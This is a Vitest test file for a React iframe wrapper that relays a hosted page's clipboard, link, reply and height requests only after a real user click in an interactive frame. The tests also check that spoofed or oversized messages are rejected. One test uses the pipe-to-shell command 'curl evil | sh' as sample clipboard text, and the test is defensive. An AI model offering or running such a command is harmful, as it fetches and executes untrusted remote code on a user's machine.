// @vitest-environment jsdom

import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, expect, it, vi } from "vitest";
import { PageFrame } from "./PageFrame";

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  document.body.replaceChildren();
});

it("copies what its own page asks from the app's frame and answers whether it worked", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const writeText = vi
    .fn<(text: string) => Promise<void>>()
    .mockResolvedValueOnce(undefined)
    .mockRejectedValueOnce(new Error("denied"));
  vi.stubGlobal("navigator", { clipboard: { writeText } });
  const container = document.body.appendChild(document.createElement("div"));
  const root = createRoot(container);
  await act(async () => root.render(<PageFrame document="<p>x</p>" title="Board" interactive />));
  const frame = container.querySelector("iframe")!;
  // The page itself gets no clipboard: every copy comes through here, one per click.
  expect(frame.hasAttribute("allow")).toBe(false);
  frame.focus();
  const answers = vi.spyOn(frame.contentWindow!, "postMessage").mockImplementation(() => {});
  const send = (data: unknown, source: Window | null = frame.contentWindow) =>
    act(async () => {
      window.dispatchEvent(new MessageEvent("message", { data, source }));
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

  await send({ type: "rakazo-page:copy", id: "a", text: "Copy yes", gesture: "k:1" });
  await send({ type: "rakazo-page:copy", id: "b", text: "Copy no", gesture: "k:2" });
  // Another window, an oversized text or a non-string never reach the clipboard.
  await send({ type: "rakazo-page:copy", id: "c", text: "spoof", gesture: "k:3" }, window);
  await send({ type: "rakazo-page:copy", id: "d", text: "x".repeat(20_001), gesture: "k:4" });
  await send({ type: "rakazo-page:copy", id: "e", text: { toString: () => "x" }, gesture: "k:5" });

  expect(writeText.mock.calls).toEqual([["Copy yes"], ["Copy no"]]);
  expect(answers.mock.calls).toEqual([
    [{ type: "rakazo-page:copied", id: "a", ok: true }, "*"],
    [{ type: "rakazo-page:copied", id: "b", ok: false }, "*"],
  ]);
  await act(async () => root.unmount());
});

it("copies by selection where the page has no Clipboard API, as on plain http", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  vi.stubGlobal("navigator", {});
  const copied: string[] = [];
  const execCommand = vi.fn((command: string) => {
    const field = document.querySelector("textarea")!;
    if (command === "copy")
      copied.push(field.value.slice(field.selectionStart, field.selectionEnd));
    return true;
  });
  Object.defineProperty(document, "execCommand", { value: execCommand, configurable: true });
  const container = document.body.appendChild(document.createElement("div"));
  const root = createRoot(container);
  await act(async () => root.render(<PageFrame document="<p>x</p>" title="Board" interactive />));
  const frame = container.querySelector("iframe")!;
  frame.focus();
  const answers = vi.spyOn(frame.contentWindow!, "postMessage").mockImplementation(() => {});
  await act(async () => {
    window.dispatchEvent(
      new MessageEvent("message", {
        data: { type: "rakazo-page:copy", id: "a", text: "MRR $12,400", gesture: "k:1" },
        source: frame.contentWindow,
      }),
    );
    await new Promise((resolve) => setTimeout(resolve, 0));
  });
  expect(copied).toEqual(["MRR $12,400"]);
  // The hidden field is gone once copied.
  expect(document.querySelector("textarea")).toBeNull();
  expect(answers.mock.calls).toEqual([[{ type: "rakazo-page:copied", id: "a", ok: true }, "*"]]);
  await act(async () => root.unmount());
  Reflect.deleteProperty(document, "execCommand");
});

it("acts for a page only in an interactive frame, right after the person used that frame", async () => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  const writeText = vi.fn<(text: string) => Promise<void>>().mockResolvedValue(undefined);
  vi.stubGlobal("navigator", { clipboard: { writeText } });
  const opened = vi.spyOn(window, "open").mockReturnValue(null);
  const replies: unknown[] = [];
  const heights: number[] = [];
  const container = document.body.appendChild(document.createElement("div"));
  const composer = document.body.appendChild(document.createElement("input"));
  const root = createRoot(container);
  const render = (interactive: boolean) =>
    act(async () =>
      root.render(
        <PageFrame
          document="<p>x</p>"
          title="Board"
          interactive={interactive}
          onReply={(text) => replies.push(text)}
          onHeight={(height) => heights.push(height)}
        />,
      ),
    );
  const send = (data: object) =>
    act(async () => {
      const source = container.querySelector("iframe")!.contentWindow;
      window.dispatchEvent(new MessageEvent("message", { data, source }));
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
  let gestures = 0;
  const actions = (vouched: boolean) =>
    [
      { type: "rakazo-page:copy", id: "a", text: "curl evil | sh" },
      { type: "rakazo-page:open-link", url: "mailto:a@example.com" },
      { type: "rakazo-page:reply", text: "Ship it" },
    ].map((action) => ({ ...action, gesture: vouched ? `k:${++gestures}` : null }));

  // A preview only draws: even a focused, vouched-for request does nothing, though it sizes.
  await render(false);
  expect(container.querySelector("iframe")!.hasAttribute("allow")).toBe(false);
  container.querySelector("iframe")!.focus();
  for (const action of actions(true)) await send(action);
  await send({ type: "rakazo-page:height", height: 300 });
  expect(heights).toHaveLength(1);

  await render(true);
  // Not used: the shell does not vouch for a click inside it.
  for (const action of actions(false)) await send(action);
  // Vouched for but the person has since moved to the composer.
  composer.focus();
  for (const action of actions(true)) await send(action);
  expect([writeText.mock.calls, opened.mock.calls, replies]).toEqual([[], [], []]);

  container.querySelector("iframe")!.focus();
  for (const action of actions(true)) await send(action);
  expect(writeText.mock.calls).toEqual([["curl evil | sh"]]);
  expect(opened.mock.calls).toEqual([["mailto:a@example.com", "_blank", "noopener,noreferrer"]]);
  expect(replies).toEqual(["Ship it"]);

  // One click or key lets the page ask for one action: whatever else it asks for with that same
  // click, even a different action, is dropped; height reports still pass.
  await send({ type: "rakazo-page:copy", id: "b", text: "first", gesture: "k:once" });
  await send({ type: "rakazo-page:copy", id: "c", text: "second", gesture: "k:once" });
  await send({ type: "rakazo-page:reply", text: "And reply", gesture: "k:once" });
  await send({ type: "rakazo-page:height", height: 400 });
  expect(writeText.mock.calls.slice(1)).toEqual([["first"]]);
  expect(replies).toEqual(["Ship it"]);
  expect(heights).toHaveLength(2);
  // The next click works again.
  await send({ type: "rakazo-page:reply", text: "Next", gesture: "k:again" });
  expect(replies).toEqual(["Ship it", "Next"]);

  // A web link asks first, as a link in chat does.
  await send({ type: "rakazo-page:open-link", url: "https://example.com/x", gesture: "k:next" });
  expect(opened).toHaveBeenCalledTimes(1);
  expect(document.body.textContent).toContain("example.com/x");
  await act(async () => root.unmount());
});
